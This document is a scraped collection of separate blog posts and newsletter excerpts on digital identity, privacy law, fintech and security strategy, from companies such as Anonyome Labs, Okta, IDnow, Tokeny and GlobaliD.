<p>Everything we do is recorded, collected, mined, profiled, stored, targeted and sold. The balance of power has shifted to the cabal of tech giants and data miners who overtly or covertly monitor and control what is seen, clicked, and cared about. At Anonyome Labs we build the tools that shift control of personal and private information from the big data miners back to the user.&nbsp;</p>
<p>Anonyome Labs was founded in 2014 and is headquartered in Woodside California, with teams in Salt Lake City, Utah and Gold Coast, Australia. Anonyome Labs has about 70 employees –&nbsp; the teams have deep enterprise and consumer expertise across identity, cyber security, authentication, authorization, privacy and cryptography – with hundreds of granted patents. </p>
<p>What are some of the products/services (Self Sovereign Identity or not) that you currently offer? Who are your target customers? What sets you apart from the competition?</p>
<p>Anonyome Labs created the Sudo Platform to provide enterprise software developers with capabilities to add persona (Sudo) based identity, privacy and cyber safety features to their applications. The Sudo Platform provides to these enterprise software developers mobile and web SDKs, sample apps, documentation and UI Kits to accelerate their application development.&nbsp;</p>
<p>Each of the capabilities of the Sudo Platform is attached to a persona. This includes masked email and masked credit cards, private telephony, private and compartmentalized browsing (with ad/tracker blocker and site reputation), VPN, password management, decentralized identity and more.</p>
<p>In addition, Anonyome Labs created the MySudo mobile application to put the same identity, privacy, and cyber security capabilities into the hands of normal users for their interactions with the online and offline world.&nbsp; Each user is able to create a number of personas (Sudos) and with each of them have access to various Sudo Platform capabilities.</p>
<p>What Self Sovereign Identity /Decentralized Identity products/services are on your roadmap?</p>
<p>A key offering of the Sudo Platform is Decentralized Identity based services.&nbsp; This includes both client (Edge Agent) and server (Cloud Agent) offerings.&nbsp; This allows the enterprise to become a Decentralized Identity Verifiable Credential Issuer and/or Validator. And it allows the enterprise’s users to take part in a decentralized identity ecosystem – by giving them a mobile wallet/agent to manage decentralized identities, connections and verifiable credentials.</p>
<p>What motivated your work in Decentralized Identity? Why did you become a node operator? What appeals to you in this field?</p>
<p>We believe that Decentralized Identity is the most important innovation in identity to help normal users have control over their personal information as they interact with the online world.&nbsp; Given Anonyome’s focus on privacy and cyber safety,&nbsp; it was a natural extension to our Sudo Platform to add Decentralized Identity services. Anonyome Labs became a founding steward of the Indicio decentralized identity network in anticipation of using that network for our customer’s enterprise applications.</p>
<p>Where do you see the future of Self Sovereign Identity/Decentralized Identity?</p>
<p>It is our belief that decentralized identity will become the core foundational technology of future privacy and cyber safety capabilities.&nbsp; Over time we will transition from the current privacy invasive technologies, to new systems founded on decentralized identity.</p>

<p>Introduction</p>
<p>Every week there seems to be mention of a new Trust Framework. People are now trying to monetize them.</p>
<p>But to understand trust frameworks, let’s first understand what constitutes trust. We must define concepts such as levels of assurances and what defines technical vs human trust?</p>
<p>Once this is better understood, the conversation about where a particular organization fits into a digital identity ecosystem is simpler. And note, in user-centric digital identity (or SSI), organizations no longer need to be at the centre of the universe.</p>
<p>About Episode<br>
During this conversation, we discuss:</p>
 
 Levels of Assurance (LOA): an introduction to LOAs as they relate to Digital Identity and why they’re an important part of the recipe in achieving digital trust. Tim and Darrell give us some practical examples of LOAs. 
 The Concept of Trust: how do we define trust at a high-level and how do we differentiate between technical and human trust? How can we build trust with credential issuers but also with credential holders? 
 The World of Trust Frameworks: what are trust frameworks and what are different types of frameworks being deployed in both the public and private sectors? How are organizations trying to monetize trust frameworks? What’s going right, and what’s going wrong with the way trust frameworks are being implemented? 
 The Importance of Open Source for Trust Creation: why is open source important for achieving digital sovereignty? Is open source the only way to improve transparency, flexibility and accountability?

<p>The&nbsp;New York Times&nbsp;recently did a&nbsp;<a href="https://www.nytimes.com/wirecutter/blog/state-of-privacy-laws-in-us/">deep dive</a>&nbsp;into the United States’ lack of a&nbsp;<a href="https://anonyome.com/2021/04/a-us-national-privacy-law-looks-more-likely-than-ever/">national data privacy law</a>&nbsp;and why it matters, and we want to drill down on some key points here.</p>



<p>The article describes the&nbsp;four basic areas&nbsp;of users’ data privacy that should be protected as a&nbsp;minimum, and calls these areas the “floor” of any future national privacy law onto which other protections could be built over time. It shows you the direction in which privacy advocates are heading.</p>



 Four basic areas make up the privacy law “floor”: 



<p></p>



  Data collection and sharing rights&nbsp;– This is the user’s fundamental right to clearly see what&nbsp;<a href="https://anonyome.com/2020/05/what-constitutes-personally-identifiable-information-or-pii/">personal data</a> companies collect, share and sell about them; their right to ask a company to delete any personal data they don’t want them to have; and their right to demand a company stop sharing their personal data.&nbsp;  Opt-in consent&nbsp;– This is where a company, not the user, does the heavy lifting on privacy, by asking the user whether they may collect, share or sell their data to third parties. Opting out takes the user a lot of time and effort; opting in puts that effort on the company. But opt-in isn’t easy to implement, which is why global opt-out functions like the&nbsp;<a href="https://www.theverge.com/2021/1/28/22252935/global-privacy-control-personal-data-tracking-ccpa-cpra-gdpr-duckduckgo">Global Privacy Control</a>&nbsp;are a popular stopgap, even&nbsp;<a href="https://digiday.com/marketing/californias-attorney-general-backs-call-for-global-privacy-control-adoption-with-fresh-enforcement-letters-to-companies/">seeming acceptable</a>&nbsp;under the&nbsp;<a href="https://oag.ca.gov/privacy/ccpa">California Consumer Privacy Act</a>. The GPC and other tools like it allow opt out at the browser or device level, not the site level.&nbsp;  Data minimization&nbsp;– This protection would pare back the data a company can collect to only the basics required for them to deliver their product or service.&nbsp;  Non-discrimination and no data-use discrimination&nbsp;– The final plank in the basic data privacy “floor” would protect users from being discriminated against for exercising their right to privacy. This means users couldn’t be charged more for opting out (or not opting in) and couldn’t be offered incentives such as discounts and coupons for opting in, for example. This requirement would also prevent companies from discriminating against users based on personal characteristics, such as religion, race or gender.&nbsp;  



 In addition to this four-plank “floor”, the privacy experts interviewed for the&nbsp;NYT&nbsp;article would like to see:&nbsp; 



<p></p>



  a more comprehensive&nbsp;<a href="https://mysudo.com/2020/11/what-is-a-data-breach/">data breach</a>&nbsp;notification law, to standardize who gets notified and some common standards for doing so  a private right of action or the right of a person to sue a company that violates their privacy  strong, well-funded enforcement agencies and resources&nbsp;  <a href="https://www.ics.ie/news/what-is-privacy-by-design-a-default">privacy by default&nbsp;</a>so apps come with the strictest built-in privacy without the user having to do anything unless they want to opt-in to certain settings.  



<p>Anonyome Labs agrees with the four-plank data privacy law “floor” and the regulatory extras proposed by the privacy community in this article. We also recognize that a national privacy law and a uniform approach to these requirements may still be a long way off, which is why we created our consumer privacy app&nbsp;<a href="https://mysudo.com/2020/10/mysudo-private-secure/">MySudo</a>&nbsp;and the privacy and cybersecurity capabilities in&nbsp;<a href="https://sudoplatform.com/">Sudo Platform</a>&nbsp;that help enterprises rapidly develop and deploy branded privacy and cybersecurity solutions.</p>

  <p>Hi, I’m edunham, and I’m an infra person. Our buzzwords include DevOps, Cloud Operations, and Site Reliability Engineering, though if you ask any two of us about the difference between those terms, you’ll get at least three answers. Whatever name it’s wearing, doing ops well requires not only the “how” of changing systems, but also the “why” of making the right changes. Although I’ve always loved helping spread the information that my colleagues need in order to build the systems that work best for them, I’ve chickened out of taking the leap into pure advocacy many times, before finally diving into it here at Okta!</p>

<p></p>

<p>I got my start in open source and the tech industry as a student software developer and sysadmin at the <a href="https://osuosl.org/">OSU Open Source Lab</a>. The OSL gives students hands-on expertise with skills essential to those careers, and there weren’t enough of us to satisfy all the companies who wanted to hire us as interns! To help address this problem, I created the first iteration of our <a href="http://devopsbootcamp.osuosl.org/">DevOps Bootcamp</a> training program. I was amazed by how good it felt to take information I was lucky enough to have special access to and share it with others who found it useful. When looking at where to steer my career after university, I considered building on my growing resume of talks to pursue evangelism roles, but it wasn’t time yet. I wanted to go out and apply my skills at scale, rather than just talking about them.</p>

<p></p>

<p>As ops for the Rust and Servo teams at <a href="https://research.mozilla.org/">Mozilla</a>, I was again able to play the positive-sum game of sharing the most interesting and useful insights I learned from my unique access to fantastic engineers. But as the sysadmin and speaker roads diverged in that forest of mercurial trees, I stuck with the ops route.</p>

<p>Missing the conference circuit as growing responsibilities meant less time for talks, I started working on a transition toward advocacy in early 2020. Faced with a choice between making the switch then or building on my ops skills for a while longer, the engineer in me won out. Switching fields, into a field that was frantically reinventing itself at the time, was just too many simultaneous changes to roll out to prod without any staging environment  or CI available.</p>

<p>Okta’s developer advocacy team is in the right place at the right time for me. I get to use <a href="https://edunham.net/pages/talks.html">my background</a> to help useful information flow out of the company to our community, as well as bringing the community’s observations and insights back to contribute to internal decision-making. Our product has made my life better as an engineer whenever I’ve worked with it, increasing my knowledge about how to do security well.</p>

<p></p>

<p>I’ve been working remotely since 2018, and I put the time that I would otherwise spend commuting into gardening and an assortment of maker projects, which I sometimes mention on <a href="https://edunham.net/">my blog</a>. I’m a volunteer firefighter and emergency medical responder with my local fire department, and I play tuba and sousaphone poorly but enthusiastically on the now-rare occasions when we can get enough people together to make some music.</p>

<p>You can find me on GitHub and some IRC networks as <code>edunham</code>, and on Twitter and LinkedIn as <code>qedunham</code>, or email me, <code>e.dunham@okta.com</code>!</p>

<p>Millennials và Gen Z đã luôn là đối tượng khách hàng trung tâm mà Fintech xoay quanh để phát triển. Song, đặt tại bối cảnh của Việt Nam, hai thế hệ này mang vai trò mạnh mẽ hơn cả, đòi hỏi các Fintech startup và cả các doanh nghiệp tài chính truyền thống liên tục thích nghi để đáp ứng các nhu cầu của họ. Bài viết này để cập đến tầm quan trọng của gen Z &amp; Millennials đối với Fintech tại Việt Nam, lối suy nghĩ về tài chính của họ, cũng như đưa ra các chiến lược cho doanh nghiệp xây dựng lòng trung thành từ hai nhóm khách hàng này.</p>



 GenZ và Millennials trong bối cảnh Việt Nam 



<p>Gen Z và Millennials lần lượt là các thế hệ sinh trong khoảng năm 1997 đến 2012 (gen Z) và 1981 đến 1996 (Millennials)[1]. Với độ tuổi từ 9-40 (năm 2021), họ sẽ sớm chiếm phần lớn lực lượng lao động, mang trong mình sự khác biệt đột phá nhờ sinh ra và lớn lên trong thời đại số hóa. Nhờ chất lượng và năng suất lao động vượt trội, cũng như điều kiện kinh tế thuận lợi, gen Z và Millennials cũng được dự đoán sẽ có mức thu nhập cao hơn và trở thành những người tiêu dùng cực kỳ tiềm năng.</p>



<p>Việt Nam, với nhiều tiềm năng về thị trường và nguồn lực, đang trong đà phát triển Fintech mạnh mẽ, thu hút 36% vốn đầu tư của khu vực Đông Nam Á năm 2019, chỉ sau Singapore, theo báo cáo của PWC[2]. Song, Việt Nam vẫn là một đất nước phụ thuộc nhiều vào tiền mặt và có nhiều người chưa có tài khoản ngân hàng (69%, theo Merchant Machine UK, 2021[3]), nên vẫn còn nhiều thị trường cho Fintech khai phá. Với bối cảnh thị trường đó, giới trẻ tại Việt Nam mang vai trò định hình mạnh mẽ hơn cả cho thị trường dịch vụ tài chính, so với các thị trường fintech đang dần bão hòa tại các nước đang phát triển.</p>



 Những thế hệ có lối đi riêng trong hành trình tìm kiếm tự do tài chính 



<p>Dù có nhiều sự khác biệt nhất định giữa gen Z và Millennials, họ vẫn có nhiều điểm tương đồng nhất định mà doanh nghiệp có Gen Z và Millennials tại Việt Nam là một thế hệ đặc biệt. Họ chứng kiến một Việt Nam “chuyển mình” nhanh chóng, từ thời kỳ bao cấp đến công cuộc Đổi Mới và nền kinh tế năng động, với tăng trưởng GDP hằng năm lên đến 7%. Và ở hiện tại, họ đang chứng kiến những sự biến động của Việt Nam trước đại dịch. Những chuyển biến đó ít nhiều ảnh hưởng đến tâm lý của Gen Z và Millennials.</p>







<p>Lớn lên trong một Việt Nam đầy biến động, Gen Z và Millennials có động lực tìm cho mình sự an toàn về mặt tài chính. Nhờ có mạng internet, họ được tiếp cận nguồn thông tin phong phú, và mở ra đa dạng hơn những cách kiếm thêm thu nhập bên cạnh những công việc “9 to 5” – những công việc truyền thống 9 giờ một ngày vốn quen thuộc với các thế hệ trước. Ngoài ra, đây cũng là thế hệ quan tâm nhiều hơn về đầu tư như cổ phiếu, bất động sản, tiền ảo (cryptocurrency),… tạo cơ hội cho Fintech bùng nổ.</p>



<p>Sự thay đổi quá nhanh chóng trong bối cảnh kinh tế xã hội cũng góp phần làm tăng lên khoảng cách thế hệ giữa Gen Z, Millennials và các thế hệ trước. Các phương thức kiếm thu nhập mới của họ thường liên quan đến không gian internet và rất khó để ghi lại theo các phương thức truyền thống. Đây cũng là một rào cản lớn khi hai thế hệ này muốn tham gia các dịch vụ tài chính truyền thống để đầu tư cho những nhu cầu của mình.</p>



<p>Chân dung khách hàng của các doanh nghiệp đã trở nên rất khác. Tư duy truyền thống đã không còn áp dụng được cho Gen Z và Millennials.</p>



 Cách nào để Fintech xây dựng niềm tin và lòng trung thành trong một thế giới đầy biến động 



<p>Cũng vì là thế hệ sống trong thời đại của thông tin mà gen Z và Millennials cũng là các khách hàng khó giữ chân. Theo Kasasa, 83% Millennials thừa nhận họ sẵn sàng đổi dịch vụ ngân hàng hiện tại để đổi lại các lợi ích cung cấp bởi các ngân hàng khác[4]. Là thế hệ sinh ra trong thời đại công nghệ, với khoảng thời gian tập trung ngày càng ngắn, gen Z và Millennials ngày càng trông đợi sự tiện lợi và dễ dàng trong các hoạt động hằng ngày, bao gồm cả hoạt động tài chính, vốn vẫn có nhiều thủ tục nhiêu khê.</p>



<p>Từ gamification (game hóa) đến liên tục tạo nhiều chương trình ưu đãi hấp dẫn, mỗi doanh nghiệp có một chiến lược riêng để giữ chân khách hàng gen Z &amp; Millennials. Những xu hướng nhìn chung có thể thấy như sau:</p>



 Trải nghiệm liền mạch, dễ dàng 



<p>Liên tục cải tiến UI/UX là một điều kiện cần của dịch vụ tài chính thời đại số. Khách hàng Gen Z và Millennials cần những dịch vụ tài chính an toàn, tiện lợi để phục vụ cho nhu cầu của họ. <a href="https://credify.one/vi/nen-tang-servicex/">serviceX </a>giúp kết nối các sản phẩm tài chính đến khách hàng khi họ thanh toán cho các dịch vụ đời sống, với thao tác đăng nhập dễ dàng thông qua Open ID Connect.</p>







 Tạo giá trị bền vững 



<p>Ngoài những mối quan tâm về các “hot trend” (xu hướng), gen Z và Millennials còn quan tâm sâu sắc đến việc tạo giá trị bền vững cho cộng đồng. Vì thế, để tạo sự gắn kết với khách hàng trẻ, các doanh nghiệp dịch vụ tài chính cần quan tâm đến những vấn đề như: tài chính toàn diện, giảm nghèo đói và bất bình đẳng, công bằng xã hội,…</p>



 Tận dụng dữ liệu lớn (big data) 



<p>Khi các hoạt động hằng ngày của gen Z và Millennials diễn ra nhiều hơn trên không gian mạng, doanh nghiệp cần có những cách tiếp cận mới để hiểu khách hàng của mình. Thành công trong việc hiểu được hồ sơ kỹ thuật số (digital identity) và tận dụng những insight từ dữ liệu lớn sẽ giúp doanh nghiệp có cái nhìn sâu sắc hơn về khách hàng của mình, từ đó dễ dàng có chiến lược chinh phục khách hàng hiệu quả.</p>



 Minh bạch trong quản lý 



<p>Theo khảo sát của Salesforce, chỉ 55% Millennials và 44% Gen Z cảm thấy thoải mái với cách các công ty đang sử dụng thông tin của họ[5], phần nào phản ánh sự thiếu tin tưởng của họ với các công ty, đặc biệt là các công ty Fintech với nhiều dữ liệu nhạy cảm như số tài khoản ngân hàng, thông tin giao dịch,… Thực trạng này đòi hỏi các công ty Fintech cần minh bạch hơn trong việc lưu trữ và quản lý thông tin của người dùng, cũng như tăng cường các biện pháp bảo mật thông tin.&nbsp;</p>



 Đa dạng hóa các sản phẩm dịch vụ 



<p>Các startup Fintech nổi bật với nhiều giải pháp đột phá, nhưng đồng thời bị giới hạn trong số lượng sản phẩm có thể cung cấp cho người dùng. Ngược lại, các tổ chức tài chính truyền thống có đa dạng sản phẩm nhưng lại thiếu tính đột phá để thu hút các khách hàng gen Z và Millennials. serviceX có thể giúp cả hai nhóm doanh nghiệp này kết nối với hệ sinh thái đối tác của Credify, giúp họ tiết kiệm nguồn lực và tập trung vào việc phát triển sản phẩm, đồng thời có thể sáng tạo các giải pháp mới dựa trên hồ sơ của khách hàng trên các nền tảng khác nhau.</p>

  <p>Establishing a verified digital identity is crucial to successful business collaboration and customer engagement in the digital economy. Verifiable Credentials provide a highly secure way of establishing digital identity. However, knowing exactly how to begin using this approach can be challenging.</p>				<br><br><a href="https://www.kuppingercole.com/watch/verifiable-credentials-a-fresh-approach-to-identity-in-the-digital-era"></a>

 GiD Report#181 — The future will be self sovereign <p>Welcome to The GiD Report, a weekly newsletter that covers GlobaliD team and partner news, market perspectives, and industry analysis. You can <a href="https://medium.com/global-id/gid-report-180-the-facebook-problem-b253ccbca5aa">check out last week’s report&nbsp;here</a>.</p><p>This week:</p>  Understanding the Sovereignty Stack  The problem with&nbsp;Tether  Chart of the&nbsp;week  Stuff happens   1. Understanding the Sovereignty Stack <p>The elegance of Bitcoin is that it was the right idea at the right time. A confluence of pre-existing technologies, the concept of a decentralized ledger pushed all the right buttons in the wake of the 2008 financial crisis. From big bank bailouts to quantitative easing, here was a bottom up solution that reframed how we thought about value — value that was innately digital in the spirit of the internet.</p><p>Just as the World Wide Web empowered people to connect and share knowledge and information, the rise of Bitcoin taught us that we could have direct ownership over our valuable assets and payments — no middle man or central operator necessary.</p><p>Twelve years after Satoshi’s white paper, Bitcoin and crypto at large are at a crossroads. With a market value north of $2 trillion, crypto is impossible to ignore — with much of the participation coming from grassroots retail investors. That’s the thing about crypto. Everyone gets a seat at the table. You don’t need to be an accredited investor. You don’t need to wait for an IPO — after all the insiders already benefited from the initial upside. All you need is a non-custodial wallet that you control. (And, of course, with opportunity and access comes responsibility and&nbsp;risk.)</p><p>But with maturation comes a new set of expectations. Regulators and the powers that be are paying attention.</p><p>It would be easy to argue that much of Coinbase’s success in the American market is due to the fact that they’ve always taken compliance seriously — stuff like proper KYC and AML protocols (Know Your Customer and Anti-Money Laundering).</p><p>Just as the WWW made IP addresses humanistic with domain names, our blockchain public/private keys will ultimately be tied to an identity — our names. For the burgeoning DeFi space, that will be a likely next step. For crypto to grow up, we need to establish identity and&nbsp;trust.</p><p>But that’s also where the elegance of Bitcoin, the internet, and the decentralized movement comes back into&nbsp;play.</p><p>Just as you own and control the BTC in your noncustodial wallet, so should you control your identity and the data behind&nbsp;it.</p><p>We should have ownership over identity, our communications, and our money. That’s the Sovereignty Stack.</p><p>To learn more about the self-sovereign future, <a href="https://www.youtube.com/watch?v=CyGggZ2pT1I">check out this recent METACO interview with GlobaliD co-founder and CEO Greg&nbsp;Kidd</a>.</p><p>Here’s <a href="http://global.id/">/gregkidd</a>:</p><blockquote>There’s an expression in philosophy called a bundle of sticks. And our identity is really that — that bundle of sticks. It can even include things like: I own a bicycle that I really identify with. And so it’s all those attributes that persist over time. If you can’t prove them, and if you can’t control them, then you’re really not in control of your identity. If you have to ask someone else for permission to prove or establish your own identity, once again, you’re not really in control of your identity.</blockquote><blockquote>So when we talk about digital identity and self sovereignty, we’re talking about a form of identity that you can control. That also should be a form that’s interoperable. It shouldn’t live within one app. You want to be able to take those credentials to any other platform. We’re not anti-company or anti-government, but any company or government that’s willing to recognize those credentials should be able to identify you, authenticate you, and then authorize you to do the things you want to&nbsp;do.</blockquote><p>The full interview:</p>  <a href="https://www.youtube.com/watch?v=CyGggZ2pT1I">The Sovereignty Stack: Re-thinking Digital Identity for Web3.0 w/ Greg KIDD [METACO TALKS&nbsp;#23]</a>   Relevant:   <a href="https://www.axios.com/takeaways-facebook-whistleblower-hearing-9f2cddf5-5f8d-4944-87cd-b488bfa3aec1.html">What you need to know from the Facebook whistleblower hearing</a>  Via <a href="http://global.id/">/j</a> — <a href="https://news.bitcoin.com/bitcoin-will-become-currency-in-brazil-soon-according-to-federal-deputy-aureo-ribeiro/">Bitcoin Will Become Currency in Brazil Soon, According to Federal Deputy Aureo Ribeiro — Bitcoin&nbsp;News</a>  Via <a href="http://global.id/">/j</a> — <a href="https://www.forbes.com/sites/stevenehrlich/2021/10/06/the-richest-under-30-in-the-world-all-thanks-to-crypto/">Meet The World’s Richest 29-Year-Old: How Sam Bankman-Fried Made A Record Fortune In The Crypto&nbsp;Frenzy</a>  Via <a href="http://global.id/antoine">/antoine</a> — <a href="https://calgaryherald.com/news/local-news/city-police-investigate-privacy-breaches-involving-portpass-vaccination-proof-app">City police investigate privacy breaches involving PORTpass vaccination proof&nbsp;app</a>  Via <a href="http://global.id/antoine">/antoine</a> — <a href="https://techcrunch.com/2021/09/21/roblox-to-add-opt-in-age-verification-for-players-and-developers/">Roblox to add opt-in age verification for players and developers — TechCrunch</a>  <a href="https://www.coindesk.com/tech/2021/10/05/web-3-is-where-the-young-people-are/">Web 3 Is Where the Young People&nbsp;Are</a>   2. The problem with&nbsp;Tether <p>If we ever needed an example why regulations might be a good idea, we wouldn’t have to look further than&nbsp;Tether.</p><p>From Bloomberg’s Zeke Faux’s investigative report:</p><blockquote>After I returned to the U.S., I obtained a document showing a detailed account of Tether Holdings’ reserves. It said they include billions of dollars of short-term loans to large Chinese companies — something money-market funds avoid. And that was before one of the country’s largest property developers, China Evergrande Group, started to collapse. I also learned that Tether had lent billions of dollars more to other crypto companies, with Bitcoin as collateral. One of them is Celsius Network Ltd., a giant quasi-bank for cryptocurrency investors, its founder Alex Mashinsky told me. He said he pays an interest rate of 5% to 6% on $1 billion in loans from Tether. Tether has denied holding any Evergrande debt, but Hoegner, Tether’s lawyer, declined to say whether Tether had other Chinese commercial paper. He said the vast majority of its commercial paper has high grades from credit ratings firms, and that its secured loans are low-risk, because borrowers have to put up Bitcoin that’s worth more than what they borrow. “All Tether tokens are fully backed,” he&nbsp;said.</blockquote><p>It’s also worth <a href="https://www.bloomberg.com/opinion/articles/2021-10-07/matt-levine-s-money-stuff-looking-for-tether-s-money">checking out Matt Levine’s&nbsp;take</a>.</p> Relevant:   <a href="https://www.bloomberg.com/opinion/articles/2021-10-07/matt-levine-s-money-stuff-looking-for-tether-s-money">Looking for Tether’s&nbsp;Money</a>  <a href="https://www.reuters.com/technology/stablecoins-face-same-safeguards-traditional-payments-2021-10-06/">Stablecoins to face same safeguards as traditional payments</a>   3.

  <p>by <a href="https://www.kuppingercole.com/team/suess">Fabian Süß</a></p><p>Oliver Carr, cybersecurity evangelist and strategist will discuss the <a href="https://www.kuppingercole.com/sessions/4902/1">Maximizing the Value of Security</a> on Wednesday, November 10 from 12:00 pm to 12:20 pm at <a href="https://www.kuppingercole.com/events/csls2021" title="Cybersecurity Leadership Summit 2021">Cybersecurity Leadership Summit 2021</a>.</p>
<p>To give you a sneak preview of what to expect, we asked Oliver some questions about his presentation.</p>
  
 Could you give us a sneak peek into your keynote: “From Burden to Benefit - How Aligning on Business Purpose and Objectives Is Critical to Maximize the Value of Security”? 
<p>I've spent the last years working very closely in the digital transformation of many large organizations, and a topic that keeps on coming up is that the security function is seen as a necessary evil at best,&nbsp;and a total hindrance at worst. The question is, what does security actually provide to the business? And does the business understand the value that security tools, security processes and security methodologies can bring? What we will look at in this session is how to align what security can bring to the table, but also to understand what the understanding of the other players in the game&nbsp;is, so that the security as a function and the security as a unit within the organizations can move forward and show how they can provide a benefit to the business and therefore move from just being a necessary cost factor to actually providing business benefit. &nbsp;</p>
 How can companies manage the competing demands of minimizing the risk of security breaches and maximizing the opportunities of agile, digital transformations? 
<p>Both security and digital transformation want the same thing at the end of the day. They want to make sure that the business is successful and that it can develop better than the competition. The ways of doing this are different, though, and especially the approach towards risk is different between security, who tend to try to minimize risk and digital transformation, who willingly take risks in order to move ahead of the competition. Bringing those two views together and understanding the necessity of being risk aware. And to decide in a specific case whether it is better to be on the side of caution or whether it is the time to be bold, to move forward is something that only works if there is an open dialog of understanding between those functions. And that is what companies need to achieve going forward if they want to be successful.</p>
 How can aligning on business purposes and objectives help to maximize the value of security? 
<p>Security is very often seen as that cost factor, as that necessary evil. If we want to show the benefit that security can bring, it needs to be brought in terms of what the company actually produces, what the organization produces in the way of products or services. Only by aligning that,&nbsp;can the amount of effort and the amount of money that we need to put into security to achieve that risk appetite that the company is willing to take,&nbsp;really acceptable, not just to the security organization, but to the company overall,&nbsp;and thereby accepting security as part of the solution and not as part of the problem. &nbsp;</p>
 What do you see as the biggest challenge for Security to becoming recognized as a value-adding function? 
<p>Security,&nbsp;in many cases,&nbsp;has been seen as this absolute&nbsp;-&nbsp;what one of my colleagues calls the&nbsp;“Ministry of No”. You're either secure or you are insecure. It is always this question of you're either with us or you are against us. The way we need to move forward,&nbsp;is to accept that between those two extremes, there is a middle ground. It's not an either - or. It's actually an also - and. And if we can move in that area together with the people who within our organizations who are driving that digital transformation, who are driving product innovation and identifying where that common ground is, and to stride down that road together, then we can be successful. And that, to me, is the biggest challenge that we are facing today towards making security a business benefit rather than just a business burden.</p>

<p>At IDnow our employees are family, and to us, this means ensuring they should feel safe, productive, inspired, and energised in their work life. This of course, has become a lot more important during the global corona pandemic since processes became digitalised and engaging in the digital world has become the new normal. At IDnow, we understand the need for a seamless online experience, and so it has become our number one priority to create the best working models for all employees.</p>
<p>Since IDnow introduced the initial remote working policy in early 2020, the benefits have by far outweighed any criticisms: “Some of the IDnow employees were sceptic in the beginning”, told Jacqueline Arlt, Recruitment Business Partner at IDnow. “But after a few months the first colleagues started asking if they can keep working remotely, even after the pandemic. They told us about the benefits they experience and the great work-life balance.” she adds. As working from home became the new normality and employees began seeing the advantages, IDnow introduced a long-term remote policy and offered employees in administrative roles the possibility to choose remote or partially remote working models.</p>
<p>Employees can now decide how and where they are working from, as we believe effective work is not based on the hours they spend at a desk. “We strongly believe that the future of working will be more and more diverse and international and as a global and digital company, offering a flexible way of working without a location-boundary will be the future” says Jacqueline Arlt.</p>
<p>IDnow offers three ways of working for their employees, and everyone who’s role allows it can choose which one suits them best. Employees can decide if and how often they come to the office. Besides from 100% office based, fully and partially home office possibilities, IDnow also offers the possibility to go on a “workcation”. Imagine you travel to see your family in a different country and would like to stay a little longer than your vacation days allow. This is one of the many possibilities with a “workcation”. This way, IDnow offers our employees the best solution to make them feel comfortable, be creative and motivated and have the best possible work-life integration.</p>
<p>You may ask, why is this so important to IDnow? Because we believe that the future is human, and that even the most digital product and company is based on the motivation and happiness of each employee. People are happier and deliver better results in a comfortable and familiar environment. “It’s one of the most important things for us, to make sure every employee at IDnow has the opportunity to maintain a happy and healthy lifestyle, a good work-life-balance and the opportunity to find inspiration in the things they love.” says Jacqueline Arlt.</p>
 Hear what some of our employees have to say about their workcation experience: 
<p>“With the workcation option, I was able to spend 2 months with my family in Italy after the Covid-restrictions got eased.” says Francesca Palmeri, Head of Controlling at IDnow.</p>
<p>“I live in Estonia with my family and work fully remote at IDnow – that offers a great work life balance for me – especially since I’m a dad for a couple of months now. I have a great connection with my team, and we work together very productively.” Pedro Gallardo, Director Product Management.</p>

<p>Controllable&nbsp;– as the assets are guaranteed by digital identity, the issuer can<a href="https://tokeny.com/tokens-recovery/"> recover tokens</a> as long as the investor can prove who they say they are.</p>
<p>Versatile&nbsp;– ERC3643 tokens can represent a multitude of assets including, but not limited to, securities, cryptocurrencies, stablecoins, fiat currencies, commodities and&nbsp;<a href="https://tokeny.com/how-fractionalization-of-nfts-enables-co-ownership/?utm_campaign=Product%20Focus&amp;utm_source=hs_email&amp;utm_medium=email&amp;_hsenc=p2ANqtz-_aXnqyJ5mETACN5-6fTfzCHbSvrqN6AFaUfBWXVXCEIpiiW7lElMCcpo50_3sb6ViF-wUu">NFTs</a>.</p>
<p>Interoperable&nbsp;– the standard is also compatible with the well known ERC20 standard and is compatible with any Ethereum Virtual Machine (EVM) compatible blockchain, sidechain or Layer 2 solution, such as Polygon.</p>
<p>Secure&nbsp;– the standard has also been audited and confirmed as secure by cybersecurity firm Kaspersky.</p>
<p>&nbsp;</p>
<p>In short, the ERC3643 provides actors with everything they need to issue assets compliantly utilising decentralized technologies. It enables this through the use of permissioned tokens and digital identities, meaning tokens can only be sent or received based on the verified credentials of investors.</p>

<p>Last week we completed our submission to the UK Government’s consultation on its proposed new Digital Markets Unit. It was an interesting exercise.</p> What is competition policy&nbsp;for? <p>Competition policy is the area where the belief system called free market economics gets its purest expression. Under this belief system, there is an invisible, mystical, magical entity called ‘the invisible hand’ of market forces (e.g. innovation and competition) whereby, if left perfectly free from any ‘interference’ from ordinary mortals (such as policy makers and regulators), always, without fail, automatically produces the best of all possible&nbsp;worlds.</p><p>In such a world, the main job of a competition regulator is to intervene if and when there is a ‘market failure’: where for one reason or another, the invisible hand is being stopped from working its magic wonders. Because markets are seen as places where money is exchanged for goods and services, the main test for market failure is the existence of monopolies where, by restricting innovation and competition, monopolists get away with charging excessive prices.</p><p>But because companies like Facebook and Google offer their services for ‘free’ — making their money via the different currency of personal data they haven’t been classed as monopolies. So for decades, they have been left free to do pretty much whatever they&nbsp;liked.</p> Wrestling with&nbsp;reality <p>To its credit, a few years back, the Competition and Markets Authority looked at reality, rather than operating on the assumption that fairy stories are facts. Its <a href="https://www.gov.uk/government/publications/competition-and-markets-authoritys-digital-markets-strategy/the-cmas-digital-markets-strategy-february-2021-refresh">final report</a>, published in early 2021, opened the door to a new approach to regulating ‘digital markets’.</p><p>The report recognised that rather than relying solely on ‘ex post’ interventions (e.g. after a market failure has been proved to exist) regulators should be able to intervene ‘ex ante’ (e.g. before problems occur, with policy goals in mind); and that rather than tackling each isolated abuse separately, one by one, they should be able to “address a wide range of concerns holistically”.</p><p>Specifically, they identified five key issues which need to be addressed:</p>  Network effects and economies of scale — where a platform’s power increases with the number of people using the platform, making it effectively invincible.  Unequal access to user data — “digital platforms collect vast quantities of unique user data, which gives them a significant competitive advantage when providing data-driven services”.  Consumer decision making and the power of defaults — where platforms’ control over default settings effectively gives them control over what choices consumers are presented with; which may be used to “influence the platform’s ability to collect users’&nbsp;data”.  Lack of transparency around complex decision-making algorithms.  The importance of ecosystems — where large collections of integrated, complementary products and services are designed in a way that favours the firm’s own services.   What we&nbsp;said <p>The Government’s consultation was on the scope and powers of the resulting new ‘Digital Markets Unit’. Most of our response was devoted to questioning the Government’s apparent assumption that by definition, all ‘innovation’ and all ‘competition’ is a good thing. It’s just not so. For example, fraudsters constantly innovate in very clever ways to con people out of their money more effectively. Improved competition in the market for 